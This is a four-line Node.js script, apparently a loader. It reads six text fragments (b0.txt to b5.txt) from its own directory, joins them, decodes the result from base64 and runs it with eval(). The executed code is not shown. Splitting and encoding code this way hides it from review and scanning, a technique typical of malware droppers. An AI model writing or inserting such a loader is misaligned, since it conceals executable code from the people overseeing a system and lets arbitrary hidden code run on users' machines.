const fs=require('fs');const path=require('path');
const parts=[];
for(let i=0;i<6;i++) parts.push(fs.readFileSync(path.join(__dirname,'b'+i+'.txt'),'utf8').trim());
eval(Buffer.from(parts.join(''),'base64').toString('utf8'));
